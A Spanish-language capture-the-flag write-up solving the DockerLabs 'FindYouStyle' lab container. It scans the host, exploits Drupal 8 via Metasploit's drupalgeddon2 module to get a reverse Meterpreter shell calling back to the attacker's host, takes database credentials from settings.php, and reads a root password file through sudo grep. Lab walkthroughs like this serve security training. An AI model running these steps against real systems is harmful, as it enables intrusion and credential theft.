---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# FindYouStyle DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip findyoustyle.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh findyoustyle.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 09:37 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Welcome to Find your own Style | Find your own Style
|_http-server-header: Apache/2.4.25 (Debian)
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds
```

Si entramos en la pagina veremos que es un `Software` `Drupal` por lo que puede tener un `exploit` veremos a ver que version tiene.

```shell
whatweb http://<IP>/
```

Info:

```
http://172.17.0.2 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
```

## Escalate user www-data

No vemos una version en especifica, por lo que vamos a probar a utilizar `metasploit` para ver si algun `exploit` funciona:

```shell
msfconsole -q
```

Si buscamos un exploit para `drupal` veremos que este funciona:

```shell
use exploit/unix/webapp/drupal_drupalgeddon2
```

Lo configuramos:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.120.128:7777 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.120.128:7777 -> 172.17.0.2:38468) at 2025-01-17 09:47:59 -0500

meterpreter > getuid
Server username: www-data
```

Vemos que obtendremos una shell como el usuario `www-data`.

## Escalate user ballenita

Si listamos los usuarios con una `bash` veremos los siguientes:

```shell
cat /etc/passwd | grep "/bin/bash"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

Vemos el usuario `ballenita`, si nos vamos al siguiente directorio:

```shell
cd /var/www/html/sites/default
```

Vemos un archivo de configuracion tipico de `drupal` donde suele tener credeciales de la pagina:

```shell
cat settings.php
```

Info:

```
@code
 * $databases['default']['default'] = array (
 *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
 *   'username' => 'ballenita',
 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 *   'host' => 'localhost',
 *   'port' => '3306',
 *   'driver' => 'mysql',
 *   'prefix' => '',
 *   'collation' => 'utf8mb4_general_ci',
 * );
 * @endcode
```

Vemos una parte interesante, por lo que vamos a probar la contraseña que pone como `ballenitafeliz` de la siguiente forma:

```shell
su ballenita
```

Metemos como contraseña `ballenitafeliz` y veremos que somo dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ballenita on 9421cefb0a55:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on 9421cefb0a55:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Vemos que podemos utilizar el binario `grep` y `ls`, como el usuario `root`, por lo que haremos lo siguiente:

Si listamos la carpeta de `root` veremos lo siguiente:

```shell
sudo ls /root
```

Info:

```
secretitomaximo.txt
```

Por lo que podremos leer el archivo con `grep` de la siguiente forma:

```shell
LFILE=/root/secretitomaximo.txt
sudo grep '' $LFILE
```

Info:

```
nobodycanfindthispasswordrootrocks
```

Puede ser que sea la contraseña de `root`.

```shell
su root
```

Metemos como contraseña `nobodycanfindthispasswordrootrocks` y veremos que ya seremos `root`, por lo que habremos terminado.
